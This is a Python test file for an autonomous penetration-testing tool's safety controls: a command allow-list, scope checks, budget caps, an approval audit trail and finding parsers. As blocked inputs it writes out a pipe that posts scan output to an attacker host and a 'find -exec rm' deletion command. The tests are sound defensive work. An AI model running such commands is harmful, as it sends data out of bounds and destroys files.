"""Phase 28 — autonomous-mode hardening tests (6 borrowed patterns).

Covers every new surface:
  * argv allow-list gate: wrappers (sudo/env/find -exec) walked through;
    subshells rejected; pipelines must all pass; default behaviour
    unchanged when no allow-list set.
  * dial-time scope re-check: bare IPs, URLs with hostnames, no-CIDR
    rules, in-scope and out-of-scope resolutions.
  * budget caps: tokens + turns exhaust; verdict is `skipped_budget`;
    unbounded (0) still works.
  * approver attribution: rule/human/system/dry_run attribution written
    to every verdict record; Fact ledger receives them too.
  * fact_ledger: record/get/list/reopen/replay/latest_state round-trip;
    append-only semantics (reopen never mutates the original).
  * verified findings: nuclei + generic parsers emit verified + quote;
    unverified parse paths still work.
"""
import json
import os
import sys
import sqlite3
import tempfile

os.environ["OLLAMA_HOST"] = "http://127.0.0.1:1"
os.environ["MIMIR_LLM_TIMEOUT"] = "0.5"

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import autopilot                                 # noqa: E402
import scope_guard                                # noqa: E402
import fact_ledger                                # noqa: E402
import parsers                                    # noqa: E402


def _tmp(suffix=""):
    fd, p = tempfile.mkstemp(suffix=suffix, prefix="p28-")
    os.close(fd)
    return p


def _cleanup(*paths):
    for p in paths:
        for suffix in ("", "-wal", "-shm", "-journal"):
            x = p + suffix
            if os.path.exists(x):
                try:
                    os.unlink(x)
                except OSError:
                    pass


def _mkstep(**over):
    base = {"technique_id": "T1046", "host": "10.0.0.5",
            "command": "echo probe", "risk": "safe", "order": 1}
    base.update(over)
    return base


def _mkeng(steps):
    return {"attack_paths": [{"id": "P", "kind": "recon", "steps": steps}],
            "modules": []}


def _verdicts(result):
    return [r["verdict"] for r in result["results"]]


# --------------------------------------------------------------------------- #
# Fix: argv allow-list
# --------------------------------------------------------------------------- #
def test_argv_allowlist_no_op_when_empty():
    step = _mkstep(command="nmap -sV 10.0.0.5")
    ok, reason = autopilot._gate_argv_allowlist(step, allowed_bins=frozenset())
    assert ok is True


def test_argv_allowlist_blocks_disallowed_binary():
    step = _mkstep(command="curl http://10.0.0.5/")
    ok, reason = autopilot._gate_argv_allowlist(
        step, allowed_bins=frozenset(["nmap"]))
    assert ok is False
    assert "argv_not_allowed" in reason
    assert "curl" in reason


def test_argv_allowlist_allows_whitelisted_binary():
    step = _mkstep(command="nmap -sV 10.0.0.5")
    ok, _ = autopilot._gate_argv_allowlist(
        step, allowed_bins=frozenset(["nmap"]))
    assert ok is True


def test_argv_allowlist_walks_through_sudo_wrapper():
    step = _mkstep(command="sudo nmap -sV 10.0.0.5")
    ok, _ = autopilot._gate_argv_allowlist(
        step, allowed_bins=frozenset(["nmap"]))
    assert ok is True


def test_argv_allowlist_walks_through_env_var_prefix():
    step = _mkstep(command="DEBUG=1 nmap -sV 10.0.0.5")
    ok, _ = autopilot._gate_argv_allowlist(
        step, allowed_bins=frozenset(["nmap"]))
    assert ok is True


def test_argv_allowlist_rejects_subshell_expansion():
    step = _mkstep(command="nmap $(echo -sV) 10.0.0.5")
    ok, reason = autopilot._gate_argv_allowlist(
        step, allowed_bins=frozenset(["nmap", "echo"]))
    assert ok is False
    assert "subshell" in reason


def test_argv_allowlist_rejects_pipe_with_disallowed_binary():
    # nmap allowed; curl is not. The pipe forces BOTH to pass.
    step = _mkstep(command="nmap -sV 10.0.0.5 | curl --data-binary @- http://atk/")
    ok, reason = autopilot._gate_argv_allowlist(
        step, allowed_bins=frozenset(["nmap"]))
    assert ok is False
    assert "curl" in reason


def test_argv_allowlist_handles_find_exec():
    # The real command is after -exec; chmod must be in the allow-list.
    step = _mkstep(command="find /tmp -name '*.log' -exec rm {} \\;")
    ok, reason = autopilot._gate_argv_allowlist(
        step, allowed_bins=frozenset(["find"]))
    assert ok is False
    assert "rm" in reason


def test_argv_allowlist_integrated_through_run():
    eng = _mkeng([_mkstep(command="curl http://10.0.0.5/")])
    out = autopilot.run(eng, dry_run=True, allowed_bins=["nmap"])
    assert _verdicts(out) == ["skipped_argv_not_allowed"]


# --------------------------------------------------------------------------- #
# Fix: dial-time scope re-check
# --------------------------------------------------------------------------- #
def test_scope_guard_no_roe_is_ok():
    ok, reason, _ = scope_guard.check("nmap 10.0.0.5", None)
    assert ok is True
    assert reason == "no_roe"


def test_scope_guard_no_cidr_rules_is_ok():
    rules = {"in_scope": ["example.com"]}        # hostname, not a CIDR
    ok, reason, _ = scope_guard.check("nmap example.com", rules)
    assert ok is True
    assert reason == "no_cidr_scope"


def test_scope_guard_in_scope_bare_ip_passes():
    rules = {"in_scope": ["10.0.0.0/24"]}
    ok, _, resolved = scope_guard.check("nmap 10.0.0.5", rules)
    assert ok is True
    assert resolved["10.0.0.5"] == {"10.0.0.5"}


def test_scope_guard_out_of_scope_bare_ip_fails():
    rules = {"in_scope": ["10.0.0.0/24"]}
    ok, reason, _ = scope_guard.check("nmap 192.0.2.99", rules)
    assert ok is False
    assert "scope_drift" in reason
    assert "192.0.2.99" in reason


def test_scope_guard_url_host_resolved_and_checked():
    rules = {"in_scope": ["10.0.0.0/24"]}
    # unresolvable hostname — scope_guard is a safety net, not the only
    # gate; empty resolution should NOT flunk the step (emit-time gate
    # is authoritative).
    ok, _, _ = scope_guard.check(
        "curl https://does-not-resolve.invalid.lab/", rules)
    assert ok is True


def test_scope_guard_mixed_resolution_fails_on_any_out():
    rules = {"in_scope": ["10.0.0.0/24"]}
    ok, reason, _ = scope_guard.check(
        "nmap 10.0.0.5 203.0.113.42", rules)
    assert ok is False
    assert "203.0.113.42" in reason


# --------------------------------------------------------------------------- #
# Fix: budget caps
# --------------------------------------------------------------------------- #
def test_budget_turns_exhausted_skips_remaining():
    eng = _mkeng([_mkstep(command="echo a", order=i) for i in range(5)])
    out = autopilot.run(eng, noise_ceiling=10, timeout_s=10,
                        budget_turns=2)
    verdicts = _verdicts(out)
    # First two execute; the budget check on the third fires skipped_budget
    # and breaks the loop.
    assert verdicts.count("executed_ok") == 2
    assert "skipped_budget" in verdicts


def test_budget_tokens_zero_is_unbounded():
    eng = _mkeng([_mkstep(command="echo a", order=i) for i in range(3)])
    out = autopilot.run(eng, noise_ceiling=10, timeout_s=10,
                        budget_tokens=0)
    assert _verdicts(out).count("executed_ok") == 3


def test_budget_skip_record_carries_attribution():
    eng = _mkeng([_mkstep(command="echo a", order=i) for i in range(3)])
    out = autopilot.run(eng, noise_ceiling=10, timeout_s=10,
                        budget_turns=1)
    skip = next(r for r in out["results"] if r["verdict"] == "skipped_budget")
    assert skip["approved_by"] == "rule"


# --------------------------------------------------------------------------- #
# Fix: approver attribution
# --------------------------------------------------------------------------- #
def test_approver_attribution_rule_on_executed_ok():
    eng = _mkeng([_mkstep(command="echo a")])
    out = autopilot.run(eng, noise_ceiling=10, timeout_s=10)
    r = out["results"][0]
    assert r["verdict"] == "executed_ok"
    assert r["approved_by"] == "rule"


def test_approver_attribution_system_on_dry_run():
    eng = _mkeng([_mkstep(command="echo a")])
    out = autopilot.run(eng, dry_run=True)
    assert out["results"][0]["approved_by"] == "system"


def test_approver_attribution_rule_on_gate_skip():
    eng = _mkeng([_mkstep(host="target.gov", command="echo a")])
    out = autopilot.run(eng, dry_run=True)
    r = out["results"][0]
    assert r["verdict"] == "skipped_institutional"
    assert r["approved_by"] == "rule"


# --------------------------------------------------------------------------- #
# Fix: fact_ledger — append-only; reopen never mutates
# --------------------------------------------------------------------------- #
def test_fact_ledger_record_and_get():
    db = _tmp(".db")
    try:
        fid = fact_ledger.record(
            db_path=db, engagement_id="eng-1", kind="executed_ok",
            data={"host": "h1"}, source="autopilot")
        assert fid >= 1
        row = fact_ledger.get(db, fid)
        assert row["kind"] == "executed_ok"
        assert row["engagement_id"] == "eng-1"
        assert row["data"]["host"] == "h1"
        assert row["from_fact_ids"] == []
    finally:
        _cleanup(db)


def test_fact_ledger_list_filters_by_engagement_and_kind():
    db = _tmp(".db")
    try:
        fact_ledger.record(db_path=db, engagement_id="a", kind="k1")
        fact_ledger.record(db_path=db, engagement_id="a", kind="k2")
        fact_ledger.record(db_path=db, engagement_id="b", kind="k1")
        rows_a = fact_ledger.list_facts(db, "a")
        rows_a_k1 = fact_ledger.list_facts(db, "a", kind="k1")
        assert len(rows_a) == 2
        assert len(rows_a_k1) == 1
        assert rows_a_k1[0]["kind"] == "k1"
    finally:
        _cleanup(db)


def test_fact_ledger_reopen_appends_and_leaves_original_untouched():
    db = _tmp(".db")
    try:
        orig = fact_ledger.record(db_path=db, engagement_id="e",
                                  kind="executed_ok",
                                  data={"result": "clean"})
        new = fact_ledger.reopen(db_path=db, fact_id=orig,
                                 reason="false positive on re-check")
        # Original still there, unchanged.
        row = fact_ledger.get(db, orig)
        assert row["kind"] == "executed_ok"
        assert row["data"]["result"] == "clean"
        # Reopen cites it via from_fact_ids.
        reopen_row = fact_ledger.get(db, new)
        assert reopen_row["kind"] == "reopen"
        assert reopen_row["from_fact_ids"] == [orig]
        assert reopen_row["data"]["corrects_id"] == orig
    finally:
        _cleanup(db)


def test_fact_ledger_reopen_rejects_unknown_id():
    db = _tmp(".db")
    try:
        try:
            fact_ledger.reopen(db_path=db, fact_id=9999, reason="x")
            raise AssertionError("expected ValueError")
        except ValueError:
            pass
    finally:
        _cleanup(db)


def test_fact_ledger_replay_in_append_order():
    db = _tmp(".db")
    try:
        ids = [fact_ledger.record(db_path=db, engagement_id="e", kind=f"k{i}")
               for i in range(3)]
        emitted = [f["id"] for f in fact_ledger.replay(db, "e")]
        assert emitted == ids
    finally:
        _cleanup(db)


def test_fact_ledger_latest_state_tracks_reopened():
    db = _tmp(".db")
    try:
        a = fact_ledger.record(db_path=db, engagement_id="e", kind="executed_ok")
        fact_ledger.record(db_path=db, engagement_id="e", kind="executed_ok")
        fact_ledger.reopen(db_path=db, fact_id=a, reason="FP")
        s = fact_ledger.latest_state(db, "e")
        assert s["facts_total"] == 3
        assert s["by_kind"]["executed_ok"] == 2
        assert s["by_kind"]["reopen"] == 1
        assert a in s["reopened"]
    finally:
        _cleanup(db)


def test_autopilot_writes_fact_per_verdict_when_fact_db_set():
    db = _tmp(".db")
    try:
        eng = _mkeng([_mkstep(command="echo a")])
        autopilot.run(eng, noise_ceiling=10, timeout_s=10,
                      fact_db=db, engagement_id="eng-x")
        rows = fact_ledger.list_facts(db, "eng-x")
        assert len(rows) >= 1
        assert rows[0]["source"] == "autopilot"
        assert rows[0]["kind"] == "executed_ok"
    finally:
        _cleanup(db)


# --------------------------------------------------------------------------- #
# Fix: verified findings
# --------------------------------------------------------------------------- #
def test_nuclei_finding_is_verified_with_evidence_quote():
    stdout = json.dumps({
        "template-id": "CVE-2024-99999",
        "info": {"name": "example", "severity": "high",
                 "classification": {"cve-id": ["CVE-2024-99999"]}},
        "host": "https://x.lab/",
        "matched-at": "https://x.lab/api/endpoint"})
    r = parsers.dispatch("nuclei -jsonl", stdout)
    f = r.new_findings[0]
    assert f["verified"] is True
    assert "https://x.lab/api/endpoint" in f["evidence_quote"]


def test_generic_finding_quotes_surrounding_context():
    text = "scan output: vulnerable to CVE-2023-12345 as noted in advisory."
    r = parsers.dispatch("curl -s https://x.lab/", text)
    f = next(x for x in r.new_findings if x["cve"] == "CVE-2023-12345")
    assert f["verified"] is True
    assert "CVE-2023-12345" in f["evidence_quote"]
    assert "advisory" in f["evidence_quote"]
